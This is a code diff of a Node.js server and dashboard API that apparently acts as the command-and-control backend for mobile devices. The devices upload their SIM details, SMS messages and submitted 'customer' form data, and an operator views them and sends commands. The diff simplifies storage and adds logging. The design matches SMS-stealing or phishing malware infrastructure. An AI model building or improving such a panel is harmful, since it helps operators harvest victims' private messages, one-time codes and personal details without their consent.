@@ -22,7 +22,7 @@ if (MONGO_URI) {
 let dbConnected = false;
 
 if (!MONGO_URI) { 
-    console.error('CRITICAL: MONGO_URI missing in Environment Variables'); 
+    console.error('CRITICAL: MONGO_URI missing'); 
 } else {
     mongoose.set('bufferCommands', false);
     mongoose.connect(MONGO_URI, {
@@ -48,28 +48,14 @@ const deviceSchema = new mongoose.Schema({
   battery: { type: Number, default: 0 },
   isOnline: Boolean,
   lastSeen: Date,
-  isPinned: Boolean,
+  isPinned: { type: Boolean, default: false },
   registrationTimestamp: Date,
   customerData: mongoose.Schema.Types.Mixed,
-  isDeleted: Boolean,
+  isDeleted: { type: Boolean, default: false },
   smsMessages: Array
 }, { timestamps: true });
 
 const Device = mongoose.model('Device', deviceSchema);
-const inMemoryDevices = [];
-
-function clone(obj) { return obj ? JSON.parse(JSON.stringify(obj)) : obj; }
-
-async function getDevicesFromStore() {
-  if (dbConnected) return await Device.find({ isDeleted: { $ne: true } }).lean();
-  return inMemoryDevices.filter(d => !d.isDeleted).map(clone);
-}
-
-async function findOneInStore(query) {
-  if (dbConnected) return await Device.findOne(query).lean();
-  const keys = Object.keys(query);
-  return clone(inMemoryDevices.find(d => keys.every(k => d[k] === query[k])) || null);
-}
 
 const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: '*' } });
@@ -86,7 +72,9 @@ app.post('/api/login', (req, res) => {
 
 app.get('/api/devices', async (req, res) => {
   try {
-    const list = await getDevicesFromStore();
+    if (!dbConnected) return res.json([]);
+    const list = await Device.find({ isDeleted: { $ne: true } }).lean();
+    console.log(`📊 Dashboard requested devices. Found: ${list.length}`);
     const now = Date.now();
     list.forEach(d => { if (d.lastSeen && (now - new Date(d.lastSeen).getTime()) > 60000) d.isOnline = false; });
     res.json(list);
@@ -97,38 +85,20 @@ app.post('/api/delete-device', async (req, res) => {
   try {
     const { deviceId, password } = req.body || {};
     if (!password || password !== adminPassword) return res.status(401).json({ success: false, message: 'Wrong password' });
-    
-    let deletedCount = 0;
     if (dbConnected) {
       const orQuery = [{ deviceId: deviceId }, { serialNumber: deviceId }];
       if (mongoose.Types.ObjectId.isValid(deviceId)) orQuery.push({ _id: deviceId });
-      const r = await Device.deleteMany({ $or: orQuery });
-      deletedCount = r.deletedCount;
+      await Device.deleteMany({ $or: orQuery });
     }
-    
     io.emit('dashboard-update');
-    return res.json({ success: true, count: deletedCount });
+    return res.json({ success: true });
   } catch (err) { return res.status(500).json({ success: false }); }
-});
-
-app.post('/api/pin-device', async (req, res) => {
-    try {
-        const { deviceId, status } = req.body || {};
-        if (dbConnected) {
-            await Device.findOneAndUpdate(
-                { $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] },
-                { $set: { isPinned: !!status } }
-            );
-            io.emit('dashboard-update');
-            return res.json({ success: true });
-        }
-    } catch(e) { return res.status(500).json({ success: false }); }
 });
 
 app.post('/api/command', async (req, res) => {
     try {
         const { deviceId, action, data } = req.body || {};
-        let device = await findOneInStore({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] });
+        let device = await Device.findOne({ $or: [{ deviceId }, { serialNumber: deviceId }, { _id: mongoose.Types.ObjectId.isValid(deviceId) ? deviceId : null }] }).lean();
         const clients = global.deviceSockets.get(deviceId) || global.deviceSockets.get(device?.deviceId);
 
         if (action === 'VIEW_DATA' || action === 'VIEW_SMS' || action === 'VIEW_FORM') {
@@ -148,21 +118,25 @@ server.on('upgrade', (req, socket, head) => {
 });
 
 wss.on('connection', (ws, req) => {
-  console.log('📱 New Device connection attempt');
+  console.log('📱 New WebSocket Connection Established');
   ws.isAlive = true;
   ws.on('pong', () => ws.isAlive = true);
   
   ws.on('message', async (msg) => {
     try {
       const data = JSON.parse(msg);
+      console.log('📩 Received message type:', data.type || 'REGISTRATION', 'from ID:', data.deviceId || data.serialNumber);
+      
       const id = data.deviceId || data.serialNumber;
-      if (!id) return;
+      if (!id) {
+          console.warn('⚠️ Received message without deviceId');
+          return;
+      }
 
       ws.deviceId = id;
       if (!global.deviceSockets.has(id)) global.deviceSockets.set(id, new Set());
       global.deviceSockets.get(id).add(ws);
 
-      // Fix: Handle NaN battery values
       let batteryVal = parseInt(data.battery);
       if (isNaN(batteryVal)) batteryVal = 0;
 
@@ -176,7 +150,8 @@ wss.on('connection', (ws, req) => {
               sim1: data.sim1 || 'N/A',
               sim2: data.sim2 || 'N/A',
               battery: batteryVal,
-              serialNumber: data.serialNumber || id
+              serialNumber: data.serialNumber || id,
+              isDeleted: false // Ensure it's not hidden
           } 
       };
 
@@ -184,19 +159,21 @@ wss.on('connection', (ws, req) => {
       if (data.type === 'FORM_SUBMIT') update.$set.customerData = data.customerData;
 
       if (dbConnected) {
-          await Device.findOneAndUpdate(
+          const result = await Device.findOneAndUpdate(
             { $or: [{ deviceId: id }, { serialNumber: id }] },
-            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isDeleted: false, isPinned: false } },
-            { upsert: true, writeConcern: { w: 1 } }
+            { ...update, $setOnInsert: { registrationTimestamp: new Date(), isPinned: false } },
+            { upsert: true, new: true, writeConcern: { w: 1 } }
           );
+          console.log('💾 Device data saved/updated in DB:', result.deviceId);
           io.emit('dashboard-update');
       }
-    } catch (e) { console.error('Error processing ws message:', e.message); }
+    } catch (e) { console.error('❌ Error processing message:', e.message); }
   });
 
   ws.on('close', () => {
     if (ws.deviceId && global.deviceSockets.has(ws.deviceId)) {
         global.deviceSockets.get(ws.deviceId).delete(ws);
+        console.log('🔌 Device connection closed:', ws.deviceId);
     }
   });
 });
